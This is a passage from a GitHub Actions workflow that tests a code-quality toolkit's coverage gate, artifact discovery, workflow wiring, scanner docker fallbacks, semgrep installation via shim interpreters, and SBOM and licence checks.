          # `msg=$(failing-command)` aborts under the runner's `bash -e`, which
          # `set -uo pipefail` does not switch off — the step would die before
          # asserting anything. The `|| rc=$?` puts it in a tested context, and
          # the exit code is worth asserting anyway.
          rc=0
          msg=$(python3 scripts/coverage.py --report $F/lcov.info \
                  --floor-file $F/floor.json --diff-file $F/changed.diff \
                  --patch-threshold 50 2>&1 >/dev/null) || rc=$?
          [[ "$rc" == '1' ]] || {
            echo "::error::the red patch gate exited $rc, expected 1"; exit 1; }

          # The aggregate must still be GREEN in the same run. This pairing is
          # the whole of #112: if the ratchet ever goes red here the fixture has
          # been broken and the gate is no longer proving anything.
          grep -q 'coverage held at 94.95%' <<<"$msg" || {
            echo '::error::the aggregate did not stay green — the fixture regressed'
            printf '%s\n' "$msg"; exit 1; }

          for want in 'PATCH COVERAGE BELOW THE BAR' '0.00%' 'bar is 50.00%' \
                      'src/rollup.ts: 62-65'; do
            grep -qF "$want" <<<"$msg" || {
              echo "::error::the failure message never says: $want"
              printf '%s\n' "$msg"; exit 1; }
          done
          echo 'OK: green aggregate, red patch, and the exact lines named'

      # ---- through the action, against a real git history -------------------
      #
      # The steps above hand the script a committed .diff. This one builds an
      # actual two-commit history whose diff IS that fixture change, so the
      # action's own base-ref resolution and `git diff` are what produce the
      # changed lines — the part no committed fixture can exercise.
      - name: Build a repo whose history is the fixture change
        shell: bash
        run: |
          set -Eeuo pipefail
          R=/tmp/patchrepo; rm -rf $R; mkdir -p $R/samples/coverage/patch/src
          cp samples/coverage/patch/src/rollup.ts $R/samples/coverage/patch/src/
          cd $R
          git init -q . && git config user.email t@t && git config user.name t
          # Reverse the fixture change to get the "before" tree.
          git apply -R "$GITHUB_WORKSPACE/samples/coverage/patch/changed.diff"
          git add -A && git commit -qm 'well-covered module'
          git branch -q base-branch
          git apply "$GITHUB_WORKSPACE/samples/coverage/patch/changed.diff"
          git add -A && git commit -qm 'add a function no test calls'
          # grep -v '^+++' rather than '^+[^+]': the change ends with a blank
          # added line, which the second form silently drops. Off by one against
          # the hand-count in the fixture README is exactly the kind of drift
          # this assertion exists to catch, so it must count what that README
          # counts.
          added=$(git diff base-branch HEAD | grep '^+' | grep -cv '^+++' || true)
          [[ "$added" == '9' ]] || {
            echo "::error::the built history adds $added lines, expected 9"; exit 1; }
          echo 'OK: two commits, and their diff is the fixture change'

      - name: A real git diff measures the same as the committed fixture
        shell: bash
        run: |
          set -Eeuo pipefail
          F="$GITHUB_WORKSPACE/samples/coverage/patch"
          cd /tmp/patchrepo
          # git's own output, not a hand-written .diff. If the two ever
          # disagree, the committed fixtures have drifted from what git
          # actually produces and every number above is measuring the wrong
          # thing.
          git diff base-branch HEAD > /tmp/real.diff
          rc=0
          out=$(python3 "$GITHUB_WORKSPACE/scripts/coverage.py" \
                  --report "$F/lcov.info" --floor-file "$F/floor.json" \
                  --diff-file /tmp/real.diff --patch-threshold 50 2>/dev/null) || rc=$?
          [[ "$rc" == '1' ]] || {
            echo "::error::a real git diff of the fixture change exited $rc, expected 1"
            printf '%s\n' "$out"; exit 1; }
          grep -q '^patch_coverage=0.00' <<<"$out" || {
            echo '::error::a real git diff measured something other than 0.00%'
            printf '%s\n' "$out"; exit 1; }
          grep -q '^status=ok' <<<"$out" || {
            echo '::error::the aggregate went red on the real diff'
            printf '%s\n' "$out"; exit 1; }
          echo 'OK: git diff and the committed fixture measure identically'

      # ---- the action's own half: resolving the base ------------------------
      #
      # Both cases below are event-independent on purpose. A test whose outcome
      # depends on whether CI happened to run from a push or a pull request is
      # a test that reports something different on the two branches.
      - id: badbase
        uses: ./actions/coverage
        continue-on-error: true
        with:
          report: samples/coverage/patch/lcov.info
          floor-file: samples/coverage/patch/floor.json
          base-ref: no-such-ref-anywhere
      - name: A named base that cannot be resolved must fail, not pass empty
        shell: bash
        env:
          OUTCOME: ${{ steps.badbase.outcome }}
          STATUS: ${{ steps.badbase.outputs.patch-status }}
        run: |
          set -Eeuo pipefail
          # An unresolvable base yields an empty diff; an empty diff has no
          # measurable added lines; no measurable added lines reports
          # not-applicable and exits 0. So a broken checkout would render as a
          # passing patch gate, run after run, and nothing would ever say so.
          if [[ "$OUTCOME" != 'failure' ]]; then
            echo "::error::an unresolvable base ref gave outcome '$OUTCOME' and patch-status '$STATUS' — a broken checkout must not read as a passing gate"
            exit 1
          fi
          echo 'OK: a base that cannot be resolved is an error'

      - id: gateoff
        uses: ./actions/coverage
        with:
          report: samples/coverage/patch/lcov.info
          floor-file: samples/coverage/patch/floor.json
          patch-threshold: '0'
      - name: patch-threshold 0 keeps the ratchet and drops the gate
        shell: bash
        env:
          STATUS: ${{ steps.gateoff.outputs.patch-status }}
          COVERAGE: ${{ steps.gateoff.outputs.coverage }}
        run: |
          set -Eeuo pipefail
          [[ "$STATUS" == 'off' ]] || {
            echo "::error::patch-status was '$STATUS', expected 'off'"; exit 1; }
          [[ "$COVERAGE" == '94.95' ]] || {
            echo "::error::the aggregate reported $COVERAGE with the gate off"; exit 1; }
          echo 'OK: 0 disables the gate and the ratchet still ran'

  # quality.yml's coverage-report input (#124).
  #
  # WHY THIS DOES NOT CALL quality.yml. It cannot. This repo's tree is
  # deliberately full of planted bugs, so Layer 2 fails on it BY DESIGN — the
  # layer2 job above runs with continue-on-error and asserts the scan goes red.
  # A `uses: ./.github/workflows/quality.yml` job therefore always fails here,
  # and GitHub does not support continue-on-error on a reusable-workflow call,
  # so it could never be a green check. Measured, not assumed: the first attempt
  # ran, and both calls failed on layer2 with 130 findings from samples/.
  #
  # So the coverage job is tested two ways that together cover what a call would
  # have, and #128 owns the true end-to-end once it can be run against a tree
  # that is not this one:
  #
  #   1. its shell bodies are EXTRACTED from quality.yml by step name and run
  #      here, so there is no copy to drift;
  #   2. its wiring — the `if:` and the `with:` mapping — is asserted
  #      structurally, which is what catches "plumbed but never reaches the
  #      action".
  coverage-input:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7

      - name: Extract the coverage job's own step bodies
        shell: bash
        run: |
          set -Eeuo pipefail
          ruby -ryaml -e '
            d = YAML.load_file(".github/workflows/quality.yml")
            steps = d["jobs"]["coverage"]["steps"]
            {
              "Find the reports inside the artifact" => "/tmp/find.sh",
              "A missing floor must say exactly how to record one" => "/tmp/floor.sh",
            }.each do |name, out|
              st = steps.find { |x| x["name"] == name }
              abort "no step named #{name}" if st.nil?
              File.write(out, st["run"])
            end
          '
          [[ -s /tmp/find.sh && -s /tmp/floor.sh ]]
          echo 'OK: extracted by step name, so this cannot test a stale copy'

      # A real round trip, because "the artifact hand-off works" is the one
      # claim a local directory cannot make.
      - name: Upload a report the way a consumer's test job does
        run: |
          mkdir -p /tmp/up/coverage/nested
          cp samples/coverage/patch/lcov.info /tmp/up/coverage/nested/
          cp samples/coverage/patch/cobertura.xml /tmp/up/coverage/
          echo 'not a report' > /tmp/up/coverage/notes.txt
      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
        with:
          name: e2e-coverage
          path: /tmp/up
      - uses: actions/download-artifact@37930b1c2abaa49bbe596cd826c3c89aef350131 # v7.0.0
        with:
          name: e2e-coverage
          path: /tmp/down

      - name: Reports are found by content, wherever they sit
        shell: bash
        run: |
          set -Eeuo pipefail
          export GITHUB_OUTPUT=/tmp/find.out; : > "$GITHUB_OUTPUT"
          DIR=/tmp/down ARTIFACT=e2e-coverage bash /tmp/find.sh
          # Both reports, neither the .txt — nested and root, two formats.
          grep -q 'nested/lcov.info' /tmp/find.out || {
            echo '::error::the nested lcov was not found'; cat /tmp/find.out; exit 1; }
          grep -q 'cobertura.xml' /tmp/find.out || {
            echo '::error::the cobertura report was not found'; cat /tmp/find.out; exit 1; }
          if grep -q 'notes.txt' /tmp/find.out; then
            echo '::error::a non-report file was passed to the action as a report'
            cat /tmp/find.out; exit 1
          fi
          echo 'OK: two formats, one nested, and the plain text left out'

      - name: An artifact holding no report is an error, not a pass
        shell: bash
        run: |
          set -uo pipefail
          mkdir -p /tmp/empty-art && echo hi > /tmp/empty-art/notes.txt
          export GITHUB_OUTPUT=/tmp/empty.out; : > "$GITHUB_OUTPUT"
          rc=0
          DIR=/tmp/empty-art ARTIFACT=e2e-coverage bash /tmp/find.sh >/tmp/empty.log 2>&1 || rc=$?
          [[ "$rc" != '0' ]] || {
            echo '::error::an artifact with no coverage report passed'; exit 1; }
          grep -q "e2e-coverage" /tmp/empty.log || {
            echo '::error::the failure never named the artifact it looked in'
            cat /tmp/empty.log; exit 1; }
          echo 'OK: an empty artifact fails, naming itself'

      # #75's third question: a first run must not look like a broken gate.
      - name: A missing floor prints the bootstrap, verbatim and followable
        shell: bash
        run: |
          set -uo pipefail
          rc=0
          FLOOR_FILE=/tmp/no-such-floor.json bash /tmp/floor.sh >/tmp/floor.log 2>&1 || rc=$?
          [[ "$rc" != '0' ]] || {
            echo '::error::a missing floor passed — the ratchet compared against nothing'; exit 1; }
          for want in "coverage-raise: 'true'" 'RECORDED FLOOR' '/tmp/no-such-floor.json'; do
            grep -qF "$want" /tmp/floor.log || {
              echo "::error::the bootstrap never says: $want"; cat /tmp/floor.log; exit 1; }
          done
          # And the way out has to actually work.
          echo '{"line": 95.00}' > /tmp/real-floor.json
          FLOOR_FILE=/tmp/real-floor.json bash /tmp/floor.sh >/dev/null || {
            echo '::error::following the instruction still failed'; exit 1; }
          echo 'OK: the bootstrap names the input, and following it clears it'

      # The gate itself, over the reports discovery just produced.
      #
      # The floor is written HERE rather than left absent: without it the action
      # fails on --require-floor, the step still goes red, and the assertion
      # below would pass for entirely the wrong reason.
      - name: A floor the downloaded report cannot meet
        run: |
          echo '{"line": 99.00}' > /tmp/high-floor.json
      - id: red
        uses: ./actions/coverage
        continue-on-error: true
        with:
          report: |
            /tmp/down/coverage/nested/lcov.info
          floor-file: /tmp/high-floor.json
          patch-threshold: '0'
      - name: The discovered report is what actually gets gated
        shell: bash
        env:
          OUTCOME: ${{ steps.red.outcome }}
          COVERAGE: ${{ steps.red.outputs.coverage }}
        run: |
          set -Eeuo pipefail
          [[ "$COVERAGE" == '94.95' ]] || {
            echo "::error::the downloaded artifact measured $COVERAGE, expected 94.95 — the wrong file was gated"; exit 1; }
          [[ "$OUTCOME" == 'failure' ]] || {
            echo '::error::94.95% against a 99% floor passed'; exit 1; }
          echo 'OK: the artifact round trip ends in a real verdict'

      # What a call would have caught and these cannot: that the job is wired to
      # the inputs at all.
      - name: The job's wiring is what the inputs say
        shell: bash
        run: |
          set -Eeuo pipefail
          # A quoted heredoc: no shell escaping, and — deliberately — the
          # expected values are matched as expression NAMES rather than written
          # out as literal interpolations, because actionlint parses any it
          # finds in a run block against THIS workflow's context, where
          # quality.yml's inputs do not exist.
          cat > /tmp/wiring.rb <<'RUBY'
          require 'yaml'
          j = YAML.load_file('.github/workflows/quality.yml')['jobs']['coverage']
          bad = ->(m) { STDERR.puts "::error::#{m}"; exit 1 }

          # With the input unset there must be no coverage job AT ALL. A job
          # that merely skipped would still appear as a new box in every
          # adopted consumer's PR checks the morning v1 moves.
          cond = j['if'].to_s
          bad.("the coverage job if: is #{cond.inspect}, not a guard on the input") \
            unless cond.include?('inputs.coverage-report') && cond.include?('!=')

          dl = j['steps'].find { |s| s['uses'].to_s.include?('download-artifact') }
          bad.('no download-artifact step') if dl.nil?
          bad.("the download step takes name=#{dl['with']['name'].inspect}, not the input") \
            unless dl['with']['name'].to_s =~ /inputs\.coverage-report/

          cov = j['steps'].find { |s| s['uses'].to_s.include?('actions/coverage') }
          bad.('no step calls actions/coverage') if cov.nil?

          # "plumbed but never reaches the action" is the failure a call would
          # have caught; this is what catches it without one.
          {
            'report'          => /steps\.find\.outputs\.reports/,
            'floor-file'      => /inputs\.coverage-floor-file/,
            'patch-threshold' => /inputs\.coverage-patch-threshold/,
            'raise'           => /inputs\.coverage-raise/,
          }.each do |key, want|
            got = cov['with'][key].to_s
            bad.("actions/coverage gets #{key}=#{got.inspect}, which does not carry #{want.source}") \
              unless got =~ want
          end
          # The default is stated in six documents. Only two places make it
          # BEHAVE, and if those two disagree a consumer's gate silently sits
          # at a bar nobody wrote down.
          w = YAML.load_file('.github/workflows/quality.yml')['on'] ||
              YAML.load_file('.github/workflows/quality.yml')[true]
          wf = w['workflow_call']['inputs']['coverage-patch-threshold']['default'].to_s
          act = YAML.load_file('actions/coverage/action.yml')['inputs']['patch-threshold']['default'].to_s
          bad.("quality.yml defaults the patch bar to #{wf.inspect} and the action to #{act.inspect}") \
            unless wf == act
          puts "OK: if: guards the input, all four inputs reach the action, " \
               "and both defaults are #{wf}"
          RUBY
          ruby /tmp/wiring.rb

  # The three tool ladders are now ONE function. This job is what stops them
  # drifting apart again — the last time they did, the docker path set semgrep's
  # working directory and the native path did not, so `--changed-only` reported
  # zero findings forever and looked like a working ratchet.
  #
  # It asserts on the RESOLVED COMMANDS, not on output: a fake `docker` on PATH
  # records what would have been executed, so the docker branch is exercised on
  # a runner that has none of the tools installed.
  tool-resolution:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
      - name: The docker fallback must build the right commands
        shell: bash
        run: |
          set -Eeuo pipefail
          SHIM=/tmp/shim; rm -rf "$SHIM"; mkdir -p "$SHIM"
          cat > "$SHIM/docker" <<'SH'
          #!/usr/bin/env bash
          [[ "$1" == "info" ]] && exit 0
          { printf 'DOCKER:'; printf ' %s' "$@"; printf '\n'; } >> "$DOCKER_LOG"
          exit 0
          SH
          chmod +x "$SHIM/docker"

          R=/tmp/tool-fixture; rm -rf "$R"; mkdir -p "$R"
          git -C "$R" init -q
          git -C "$R" config user.email t@example.com
          git -C "$R" config user.name test
          echo 'const a = 1;' > "$R/a.ts"
          git -C "$R" add -A && git -C "$R" commit -qm base

          export DOCKER_LOG=/tmp/docker.log; : > "$DOCKER_LOG"
          # A PATH with the shim and coreutils but NONE of the three tools, so
          # every ladder is forced all the way down to its docker branch.
          env PATH="$SHIM:/usr/bin:/bin" DOCKER_LOG="$DOCKER_LOG" \
            ./scripts/scan.sh "$R" --sbom /tmp/out/sbom.json --licenses MIT >/dev/null 2>&1 || true
          cat "$DOCKER_LOG"

          n=$(wc -l < "$DOCKER_LOG")
          [[ "$n" -eq 5 ]] || {
            echo "::error::expected 5 docker invocations (semgrep, gitleaks, osv, licences, sbom), got $n"
            exit 1; }

          need() {
            grep -qF -- "$1" "$DOCKER_LOG" || {
              echo "::error::missing from the docker invocations: $1"; exit 1; }
          }
          # semgrep is the only tool needing a SECOND mount — the rules live
          # outside the scanned repo — and the only one with a trailing
          # entrypoint after the image name.
          need '/baseline:ro'
          # THE DOCKER TAG IS READ FROM scan.sh, NOT WRITTEN OUT HERE.
          #
          # It used to be the literal `returntocorp/semgrep:latest`, and this
          # assertion is what caught the pin change in #43 — correctly, but by
          # failing on the fix rather than on a regression. A hardcoded copy of
          # a version string in the test for the version string is the same
          # two-sources-of-truth bug the pin itself has (STATUS §4); reading it
          # back means a future bump touches one place and this still asserts
          # that docker gets the pinned tag rather than :latest.
          PIN=$(sed -n 's/^SEMGREP_PIN="\([0-9.]*\)".*/\1/p' scripts/scan.sh | head -1)
          [[ -n "$PIN" ]] || { echo '::error::could not read SEMGREP_PIN from scripts/scan.sh'; exit 1; }
          [[ "$PIN" != "latest" ]] || { echo '::error::scan.sh is back on an unpinned docker tag'; exit 1; }
          # One --config per selected rule group, emitted by scripts/policy.py.
          # The group list is what a .maxi-quality.yml narrows; this fixture has
          # no policy file, so all three must be present.
          need "returntocorp/semgrep:$PIN semgrep --config /baseline/semgrep/general"
          need '--config /baseline/semgrep/security'
          need '--config /baseline/semgrep/conventions'
          # The results are ALWAYS written as JSON and the verdict comes from
          # them, so the docker branch has to stage the file inside the mount
          # and move it back. Before this, --json-out under docker wrote to a
          # path inside the container and the file never appeared on the host —
          # so the standing report parsed nothing and looked fine doing it.
          need '--json-output=/repo/.maxi-quality-semgrep.json'
          # -w /repo is what made the docker path correct while native was not.
          need '-w /repo ghcr.io/gitleaks/gitleaks:latest git /repo'
          # --no-resolve is asserted rather than tolerated: it is what keeps a
          # Maven pom from turning this gate into 100+ Maven Central requests
          # and an HTTP 429 (STATUS §4), and it is exactly the kind of flag that
          # gets dropped by someone tidying an argv line.
          need 'ghcr.io/google/osv-scanner:latest scan source --recursive --no-resolve /repo'
          need 'scan source --recursive --licenses=MIT /repo'
          need 'scan source --recursive --all-packages --licenses'
          echo 'OK: all three ladders resolve to the documented docker commands'

      - name: An unavailable tool must SKIP loudly, not pass quietly
        shell: bash
        run: |
          set -Eeuo pipefail
          R=/tmp/tool-fixture2; rm -rf "$R"; mkdir -p "$R"; echo x > "$R/a.txt"

          # A docker that always fails, placed FIRST on PATH. Trimming PATH is
          # not enough: ubuntu runners ship docker in /usr/bin, so a restricted
          # PATH still finds it and nothing would skip. This shim shadows it,
          # and the trimmed PATH keeps the three tools out.
          NODK=/tmp/nodocker; rm -rf "$NODK"; mkdir -p "$NODK"
          printf '#!/usr/bin/env bash\nexit 1\n' > "$NODK/docker"
          chmod +x "$NODK/docker"
          SAFE="$NODK:/usr/bin:/bin"

          rc=0
          env PATH="$SAFE" ./scripts/scan.sh "$R" > /tmp/skip.log 2>&1 || rc=$?
          cat /tmp/skip.log
          for tool in semgrep gitleaks osv; do
            grep -qE "^  $tool +SKIPPED" /tmp/skip.log || {
              echo "::error::$tool did not record a SKIPPED line"; exit 1; }
          done
          # Without --require-tools this is a PASS (partial), exit 0 — the
          # documented contract. Silent success would be the dangerous reading,
          # so the summary has to say so out loud.
          [[ $rc -eq 0 ]] || { echo "::error::expected exit 0 without --require-tools, got $rc"; exit 1; }
          grep -q 'PASS (partial)' /tmp/skip.log || {
            echo '::error::no "PASS (partial)" warning — an all-skipped scan looked like a clean one'; exit 1; }

          rc=0
          env PATH="$SAFE" ./scripts/scan.sh "$R" --require-tools > /tmp/req.log 2>&1 || rc=$?
          [[ $rc -eq 2 ]] || { echo "::error::--require-tools should exit 2 when a tool is missing, got $rc"; exit 1; }
          echo 'OK: missing tools skip loudly, and --require-tools turns that into a failure'

  # The semgrep install ladder (#131).
  #
  # Layer 2 pinned semgrep and then installed it with the AMBIENT python3. On
  # ubuntu-latest that is >= 3.11 and nothing ever fired; on a stock macOS
  # self-hosted runner it is 3.9.6, semgrep >= 1.137.0 needs >= 3.10, and the
  # job died in three seconds having scanned nothing.
  #
  # WHY SHIMS RATHER THAN A REAL OLD PYTHON: no runner this repo can rent has
  # an inadequate interpreter — a GitHub macOS image ships 3.12+ — so the only
  # honest way to hold the regression is to fake the host. Same shim-PATH
  # pattern `tool-resolution` uses above. The real install path is covered by
  # the layer2 job, which runs the action end to end on both platforms.
  semgrep-install:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
      - name: A too-old interpreter must fail with ONE line, not a pip wall
        shell: bash
        run: |
          set -Eeuo pipefail
          VER=$(sed -n 's/^SEMGREP_PIN="\([0-9.]*\)".*/\1/p' scripts/scan.sh | head -1)
          [[ -n "$VER" ]] || { echo '::error::could not read SEMGREP_PIN'; exit 1; }

          S=/tmp/shim-old; rm -rf "$S"; mkdir -p "$S"
          # A HERMETIC PATH, and it is the whole test rather than tidiness.
          # /usr/bin on a GitHub runner holds a real python3.12: leave it on
          # PATH and the ladder finds an adequate interpreter, installs happily,
          # and this step passes while asserting nothing — the premise it exists
          # to set up (a host with NO adequate interpreter) silently never held.
          # It passes on macOS either way, which is exactly how a test like this
          # rots. Only the utilities install-semgrep.sh actually uses are linked.
          for u in bash env mkdir head cat chmod grep sed; do
            ln -sf "$(command -v "$u")" "$S/$u"
          done
          # A python3 that reports 3.9.6 and records any attempt to use it as an
          # installer. Apple's interpreter, as it presents on a stock macOS box.
          cat > "$S/python3" <<'SH'
          #!/usr/bin/env bash
          [[ "$1" == "-V" ]] && echo "Python 3.9.6" && exit 0
          echo "used as installer: $*" >> /tmp/old-python-used.log
          exit 0
          SH
          chmod +x "$S/python3"
          : > /tmp/old-python-used.log

          rc=0
          env PATH="$S" ./scripts/install-semgrep.sh "$VER" /tmp/b1 \
            > /tmp/old.log 2>&1 || rc=$?
          cat /tmp/old.log
          [[ $rc -ne 0 ]] || { echo '::error::an inadequate interpreter was accepted'; exit 1; }
          # The message is the fix as much as the ladder is: the old failure
          # buried "requires >= 3.10" under every semgrep release ever published.
          grep -q "requires Python >= 3.10" /tmp/old.log || {
            echo '::error::failure does not name the required version'; exit 1; }
          grep -q "3.9.6" /tmp/old.log || {
            echo '::error::failure does not name the version actually found'; exit 1; }
          [[ $(grep -c . /tmp/old.log) -le 2 ]] || {
            echo '::error::failure is more than the one line it promises'; exit 1; }
          # And it must not have TRIED — a pip invocation here is the 400-line
          # wall coming back.
          [[ ! -s /tmp/old-python-used.log ]] || {
            echo '::error::attempted an install with the inadequate interpreter'; exit 1; }
          echo 'OK: a 3.9 host fails in one line, before pip is ever reached'

      - name: uv installs the pin on a FETCHED interpreter, not the host's
        shell: bash
        run: |
          set -Eeuo pipefail
          VER=$(sed -n 's/^SEMGREP_PIN="\([0-9.]*\)".*/\1/p' scripts/scan.sh | head -1)
          PY=$(sed -n 's/^PINNED_PYTHON="\([0-9.]*\)".*/\1/p' scripts/install-semgrep.sh | head -1)
          S=/tmp/shim-uv; rm -rf "$S"; mkdir -p "$S"
          for u in bash env mkdir head cat chmod grep sed; do
            ln -sf "$(command -v "$u")" "$S/$u"
          done
          cat > "$S/python3" <<'SH'
          #!/usr/bin/env bash
          [[ "$1" == "-V" ]] && echo "Python 3.9.6" && exit 0
          exit 0
          SH
          # The uv shim records its argv and stages a semgrep that reports the
          # version it was asked for, so the script's own verification runs.
          cat > "$S/uv" <<'SH'
          #!/usr/bin/env bash
          echo "UV: $* | bin=$UV_TOOL_BIN_DIR dl=$UV_PYTHON_DOWNLOADS" >> /tmp/uv.log
          for a in "$@"; do case "$a" in semgrep==*) v="${a#semgrep==}";; esac; done
          printf '#!/usr/bin/env bash\necho %s\n' "$v" > "$UV_TOOL_BIN_DIR/semgrep"
          chmod +x "$UV_TOOL_BIN_DIR/semgrep"
          SH
          chmod +x "$S/python3" "$S/uv"; : > /tmp/uv.log

          env PATH="$S" ./scripts/install-semgrep.sh "$VER" /tmp/b2
          cat /tmp/uv.log
          # THE PINNED INTERPRETER IS READ BACK FROM THE SCRIPT, not written out
          # here — a hardcoded copy is the same two-sources-of-truth bug the pin
          # itself has, and check-pins.sh already holds it against scan.sh.
          grep -q -- "--python $PY" /tmp/uv.log || {
            echo "::error::uv was not given the pinned interpreter ($PY)"; exit 1; }
          grep -q "semgrep==$VER" /tmp/uv.log || {
            echo '::error::uv was not given the pinned semgrep'; exit 1; }
          grep -q "bin=/tmp/b2" /tmp/uv.log || {
            echo '::error::semgrep was not installed into the bin dir the action controls'; exit 1; }
          # Explicit, because a machine-level uv.toml can turn downloads off and
          # a fallback that depends on host config is the bug being fixed.
          grep -q "dl=automatic" /tmp/uv.log || {
            echo '::error::UV_PYTHON_DOWNLOADS was not set explicitly'; exit 1; }
          echo "OK: uv fetches Python $PY regardless of the host's 3.9"

      - name: Without uv, pipx gets a CHECKED interpreter — and a wrong version still fails
        shell: bash
        run: |
          set -Eeuo pipefail
          VER=$(sed -n 's/^SEMGREP_PIN="\([0-9.]*\)".*/\1/p' scripts/scan.sh | head -1)
          S=/tmp/shim-pipx; rm -rf "$S"; mkdir -p "$S"
          for u in bash env mkdir head cat chmod grep sed; do
            ln -sf "$(command -v "$u")" "$S/$u"
          done
          # The self-hosted macOS shape after someone installs a newer Python
          # but leaves /usr/bin/python3 as the default: both exist, and the
          # ladder has to pick the one that can actually satisfy the pin.
          cat > "$S/python3" <<'SH'
          #!/usr/bin/env bash
          [[ "$1" == "-V" ]] && echo "Python 3.9.6" && exit 0
          exit 0
          SH
          cat > "$S/python3.12" <<'SH'
          #!/usr/bin/env bash
          [[ "$1" == "-V" ]] && echo "Python 3.12.7" && exit 0
          exit 0
          SH
          cat > "$S/pipx" <<'SH'
          #!/usr/bin/env bash
          echo "PIPX: $* | bin=$PIPX_BIN_DIR" >> /tmp/pipx.log
          for a in "$@"; do case "$a" in semgrep==*) v="${a#semgrep==}";; esac; done
          printf '#!/usr/bin/env bash\necho %s\n' "$v" > "$PIPX_BIN_DIR/semgrep"
          chmod +x "$PIPX_BIN_DIR/semgrep"
          SH
          chmod +x "$S/python3" "$S/python3.12" "$S/pipx"; : > /tmp/pipx.log

          env PATH="$S" ./scripts/install-semgrep.sh "$VER" /tmp/b3
          cat /tmp/pipx.log
          grep -q -- "--python python3.12" /tmp/pipx.log || {
            echo '::error::pipx inherited the ambient interpreter instead of the adequate one'; exit 1; }
          grep -q "bin=/tmp/b3" /tmp/pipx.log || {
            echo '::error::pipx did not install into the bin dir the action controls'; exit 1; }

          # An installer that "succeeds" on the wrong version is the failure the
          # pin exists to prevent, and it would otherwise surface as rules that
          # quietly stopped existing.
          W=/tmp/shim-wrong; rm -rf "$W"; mkdir -p "$W"
          for u in bash env mkdir head cat chmod grep sed; do
            ln -sf "$(command -v "$u")" "$W/$u"
          done
          cat > "$W/python3" <<'SH'
          #!/usr/bin/env bash
          [[ "$1" == "-V" ]] && echo "Python 3.12.7" && exit 0
          exit 0
          SH
          cat > "$W/uv" <<'SH'
          #!/usr/bin/env bash
          printf '#!/usr/bin/env bash\necho 1.136.0\n' > "$UV_TOOL_BIN_DIR/semgrep"
          chmod +x "$UV_TOOL_BIN_DIR/semgrep"
          SH
          chmod +x "$W/python3" "$W/uv"
          rc=0
          env PATH="$W" ./scripts/install-semgrep.sh "$VER" /tmp/b4 \
            > /tmp/wrong.log 2>&1 || rc=$?
          cat /tmp/wrong.log
          [[ $rc -ne 0 ]] || { echo '::error::a semgrep other than the pin was accepted'; exit 1; }
          grep -q "expected '$VER'" /tmp/wrong.log || {
            echo '::error::verification failure does not name the expected version'; exit 1; }
          echo 'OK: pipx gets a checked interpreter, and an off-pin install is refused'

  # SBOM + licence gate, against this repo's own real dependency tree.
  #
  # The assertion that earns its keep is "the SBOM carries licence data". Bare
  # `--licenses` (no allowlist) is what makes osv-scanner RESOLVE licences; with
  # it omitted every component comes back as `"licenses": []` and the report
  # renders a tidy table of N UNKNOWNs. That version looked completely fine.
  #
  # There is deliberately no "passes with the right allowlist" case: it would
  # have to spell out this repo's whole transitive licence set, which Dependabot
  # changes most weeks. Both directions are covered instead by "an impossible
  # allowlist fires" and "no allowlist does not".
  sbom-licenses:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
      - name: Install the SAME osv-scanner the layer2 action pins
        shell: bash
        run: |
          set -Eeuo pipefail
          # Read the version out of the action rather than repeating it — a
          # second copy of a pin is a second thing to forget, and check-pins.sh
          # would not know about this one.
          V=$(awk '
                /^  osv-scanner-version:/ { f = 1; next }
                f && /default:/ { gsub(/.*default: *'"'"'/, ""); gsub(/'"'"'.*/, ""); print; exit }
              ' actions/layer2/action.yml)
          [[ -n "$V" ]] || { echo '::error::could not read the pinned osv-scanner version'; exit 1; }
          echo "pinned osv-scanner: $V"
          # The digest comes out of the action too, for the same reason the
          # version does: a second copy of a pin is a second thing to forget.
          #
          # Read from the action's PLATFORM TABLE rather than an input default.
          # The asset is platform-specific and so is its digest, so there is no
          # single "the sha256 of osv-scanner" left to read — and this job runs
          # on ubuntu-latest, so it wants the Linux/X64 row specifically.
          S=$(awk '
                /^          Linux\/X64\)$/ { f = 1; next }
                f && /OSV_PIN=/ { gsub(/.*OSV_PIN="/, ""); gsub(/".*/, ""); print; exit }
                f && /^          ;;$/ { exit }
              ' actions/layer2/action.yml)
          [[ -n "$S" ]] || { echo '::error::could not read the pinned Linux/X64 osv-scanner sha256'; exit 1; }
          curl -sSfL -o /tmp/osv-scanner \
            "https://github.com/google/osv-scanner/releases/download/${V}/osv-scanner_linux_amd64"
          # A release asset at a fixed tag is mutable — the same argument
          # SECURITY.md makes about `uses:` tags. Verify before executing.
          echo "${S}  /tmp/osv-scanner" | sha256sum -c -
          sudo install -m 0755 /tmp/osv-scanner /usr/local/bin/osv-scanner
          osv-scanner --version

      - name: SBOM must be produced AND carry licence data
        shell: bash
        run: |
          set -Eeuo pipefail
          # A nested path on purpose: osv-scanner exits 127 rather than creating
          # the output directory, and scan.sh mkdir -p's it. Measured.
          ./scripts/scan.sh --skip semgrep --skip gitleaks \
            --sbom /tmp/deep/nested/sbom.cdx.json --no-fail
          python3 - <<'PY'
          import json, sys
          d = json.load(open('/tmp/deep/nested/sbom.cdx.json'))
          comps = d.get('components', [])
          assert d.get('specVersion') == '1.6', d.get('specVersion')
          assert len(comps) > 20, f'only {len(comps)} components — the SBOM is near-empty'
          licensed = [c for c in comps if c.get('licenses')]
          if len(licensed) < len(comps) // 2:
              sys.exit(
                  f'::error::only {len(licensed)}/{len(comps)} components carry licence '
                  'data — the bare --licenses flag was dropped from the SBOM run'
              )
          print(f'OK: {len(comps)} components, {len(licensed)} with licences')
          PY

      - name: The licence gate must fire, and must be OFF by default
        shell: bash
        run: |
          set -uo pipefail
          rc=0
          ./scripts/scan.sh --skip semgrep --skip gitleaks \
            --licenses 'NoSuchLicense-1.0' >/tmp/gate.log 2>&1 || rc=$?
          if [[ $rc -eq 0 ]]; then
            tail -30 /tmp/gate.log
            echo '::error::an impossible allowlist passed — the licence gate does not gate'
            exit 1
          fi
          grep -q 'licenses   VIOLATIONS' /tmp/gate.log || {
            tail -30 /tmp/gate.log
            echo '::error::the failure was not attributed to the licence check'; exit 1; }

          rc=0
